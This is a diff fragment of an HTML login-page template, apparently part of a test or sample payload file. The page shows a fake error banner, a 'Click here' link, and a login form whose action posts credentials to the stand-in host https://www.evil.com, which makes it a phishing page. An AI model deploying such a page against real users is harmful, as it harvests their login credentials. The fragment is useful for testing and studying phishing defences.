@@ -6,13 +6,14 @@ info:
 <!-- Error Message -->
 <div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 20px; background: #f8d7da; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
   <div style="background-color: #f8d7da; color: #721c24; padding: 16px 20px; border-radius: 4px; border: 1px solid #f5c6cb; font-size: 16px; text-align: center;">
-    <strong>An error occurred, please log in belo or go to https://evil.com </strong>
+    <strong>An error occurred, please log in below or go to https://evil.com </strong>
   </div>
 </div>
 
 <!-- Login Form -->
 <div class="heading">
   <h1 style="text-align: center; font-size: 24px; color: #333; margin-bottom: 20px;">Login Page</h1>
+  <a href=https://www.evil.com> Click here </a>
   <div class="form-container" style="width: 100%; max-width: 400px; margin: 0 auto; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
     <form action="https://www.evil.com" method="post" class="form-signin">
       <div class="form-group" style="margin-bottom: 15px;">
